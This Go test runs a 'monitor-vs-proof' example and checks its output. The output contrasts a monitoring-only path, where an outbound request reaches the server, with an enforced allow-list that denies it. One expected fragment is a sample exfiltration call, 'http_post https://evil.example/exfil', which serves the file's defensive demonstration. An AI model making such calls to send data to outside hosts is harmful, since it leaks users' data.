//go:build !interop

package main_test

import (
	"os"
	"os/exec"
	"strings"
	"testing"
)

func TestMonitorVsProofDemo(t *testing.T) {
	cmd := exec.Command("go", "run", "../../examples/monitor-vs-proof")
	cmd.Stderr = os.Stderr
	out, err := cmd.Output()
	if err != nil {
		t.Fatalf("monitor-vs-proof failed: %v\n%s", err, out)
	}
	output := string(out)

	for _, frag := range []string{
		"Detection is not authorization.",
		"http_post https://evil.example/exfil",
		"A  UNMEDIATED (monitoring-only)",
		"t+0    SERVER OBSERVED  yes",
		"later  a detector might alert (cannot un-send)",
		"B  VISOR + allow_destination",
		"t+0    DENY  authority-expanding destination",
		"argument class URL  effect class NETWORK  MANDATE->EGRESS",
		"t+0    SERVER OBSERVED  no",
		"Enforcement is universal; capability determines scrutiny, never whether enforcement exists.",
		"Proxy enforced.",
	} {
		if !strings.Contains(output, frag) {
			t.Errorf("missing required output fragment: %q\nfull output:\n%s", frag, output)
		}
	}
}
